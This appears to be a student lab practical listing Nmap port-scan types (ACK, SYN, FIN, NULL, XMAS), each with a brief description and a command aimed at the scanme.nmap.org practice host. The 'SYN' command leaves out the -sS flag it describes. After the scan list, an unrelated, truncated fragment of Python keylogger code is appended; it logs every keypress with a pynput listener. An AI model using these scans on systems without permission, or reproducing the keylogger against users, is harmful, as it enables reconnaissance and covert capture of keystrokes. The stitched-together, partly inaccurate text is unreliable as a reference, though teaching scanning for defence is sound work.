#Practical 4#
Aim: Using Nmap scanner to perform port scanning of various forms – ACK, 
SYN, FIN, NULL, XMAS.
• ACK -sA (TCP ACK scan)
It never determines open (or even open|filtered) ports. It is used to map 
out firewall rulesets, determining whether they are stateful or not and 
which ports are filtered.
Command: nmap -sA -T4 scanme.nmap.org
• SYN (Stealth) Scan (-sS)
SYN scan is the default and most popular scan option for good reason. It 
can be performed quickly, scanning thousands of ports per second on a 
fast network not hampered by intrusive firewalls.
Command: nmap -p22,113,139 scanme.nmap.org
• FIN Scan (-sF)
Sets just the TCP FIN bit.
Command: nmap -sF -T4 scanme.nmap.org
• NULL Scan (-sN)
Does not set any bits (TCP flag header is 0)
Command: nmap –sN –p 22 scanme.nmap.org
• XMAS Scan (-sX)
Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas 
tree.
Command: nmap -sX -T4 scanme.nmap.org

format='%(asctime)s:%(message)s:') 
def on_press(key): 
 logging.info(str(key)) 
with Listener(on_press=on_press) as listener: 
 listener.join()
